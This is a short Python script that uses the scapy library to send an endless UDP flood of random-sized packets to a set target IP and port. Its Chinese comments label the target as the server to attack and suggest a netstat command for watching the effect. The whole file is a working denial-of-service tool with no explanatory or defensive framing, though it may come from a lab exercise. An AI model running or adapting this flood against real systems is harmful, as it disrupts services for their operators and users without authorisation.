from scapy.all import IP, TCP,UDP, send
import random
import internet_info
#可在終端機用指令觀察效果:netstat -an | findstr ":8080" | findstr SYN_RECEIVED | measure

#setting
my_ip = internet_info.my_IP #獲取本機IP
target_ip = "203.0.113.123" #要攻擊的server IP
target_port = 63211 #要攻擊的server port
# ############################################################

print(f"Sending UDP flood to {target_ip}:{target_port}...")

while True:
    payload = random.randint(64, 1024)
    pkt = IP(dst=target_ip) / UDP(dport=target_port) / random._urandom(payload)
    send(pkt, verbose=True)
